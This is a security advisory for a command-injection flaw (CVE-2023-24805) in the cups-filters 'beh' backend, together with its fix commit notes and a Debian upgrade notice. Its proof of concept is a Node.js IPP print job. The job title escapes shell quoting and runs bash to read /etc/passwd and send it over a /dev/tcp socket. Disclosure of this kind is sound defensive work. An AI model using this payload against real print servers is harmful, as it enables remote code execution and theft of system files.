# report a command inject Vulnerabilities in cups-filters

## Package

cups-filters
(OpenPrinting)

## Affected versions

The latest version

## Patched versions

A fix is worked on currently

## Description

### Summary

If you use beh to create an accessible network printer, this security vulnerability can cause remote code execution.

### Details

[cups-filters/backend/beh.c](https://github.com/OpenPrinting/cups-filters/blob/5c9498a57d3b331d9b1aa59df206b26a9510f335/backend/beh.c#L288)

Line 288
in
[5c9498a](/OpenPrinting/cups-filters/commit/5c9498a57d3b331d9b1aa59df206b26a9510f335)

|  | retval = system(cmdline) >> 8; |
| --- | --- |

```
   // (context: argv = beh <job-id> <user> <title> <copies> <options> [file])
    snprintf(cmdline, sizeof(cmdline),
    "%s/backend/%s '%s' '%s' '%s' '%s' '%s' %s",
    cups_serverbin, scheme, argv[1], argv[2], argv[3],
          ...
    (argc == 6 ? "1" : argv[4]),
    argv[5], filename);
          ...
  retval = system(cmdline) >> 8;
```

The system function will be called here to execute the command, and the `user` and `title` parameters are user-controlled and unsanitized .

### PoC

1. start a beh service `lpadmin -p myprinter -E -v beh:/1/3/5/socket://printer:9100`
2. exploit: // <https://github.com/williamkapke/ipp>

```
var ipp = require('ipp');
var PDFDocument = require('pdfkit');
var concat = require("concat-stream");

var doc = new PDFDocument({margin:0});
doc.text("1.pdf", 0, 0);

doc.pipe(concat(function (data) {
var printer = ipp.Printer("http://127.0.0.1:6310/printers/myprinter");
var msg = {
"operation-attributes-tag": {
"requesting-user-name": "Bumblebee",
"job-name": "';env; bash -c \"/usr/bin/cat ${PWD}etc/${PWD}/passwd > ${PWD}dev${PWD}tcp${PWD}127.0.0.1${PWD}1337\";'' #.pdf",
"document-format": "application/pdf"
},
"job-attributes-tag":{
      "media-col": {
        "media-source": "tray-2"
      }
}
, data: data
};
printer.execute("Print-Job", msg, function(err, res){
console.log(err);
console.log(res);
});
}));
doc.end();
```

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

* beh backend: Use execv() instead of system() - CVE-2023-24805

With execv() command line arguments are passed as separate strings and
not the full command line in a single string. This prevents arbitrary
command execution by escaping the quoting of the arguments in a job
with forged job title.

* beh backend: Extra checks against odd/forged input - CVE-2023-24805

- Do not allow '/' in the scheme of the URI (= backend executable
  name), to assure that only backends inside /usr/lib/cups/backend/
  are used.

- Pre-define scheme buffer to empty string, to be defined for case of
  uri being NULL.

- URI must have ':', to split off scheme, otherwise error.

- Check return value of snprintf() to create call path for backend, to
  error out on truncation of a too long scheme or on complete failure
  due to a completely odd scheme.

* beh backend: Further improvements - CVE-2023-24805

- Use strncat() instead of strncpy() for getting scheme from URI, the latter
  does not require setting terminating zero byte in case of truncation.

- Also exclude "." or ".." as scheme, as directories are not valid CUPS
  backends.

- Do not use fprintf() in sigterm_handler(), to not interfere with a
  fprintf() which could be running in the main process when
  sigterm_handler() is triggered.

- Use "static volatile int" for global variable job_canceled.

Package        : cups-filters
CVE ID         : CVE-2023-24805
Debian Bug     : 1036224

It was discovered that missing input sanitising in cups-filters, when
using the Backend Error Handler (beh) backend to create an accessible
network printer, may result in the execution of arbitrary commands.

For the stable distribution (bullseye), this problem has been fixed in
version 1.28.7-1+deb11u2.

We recommend that you upgrade your cups-filters packages.
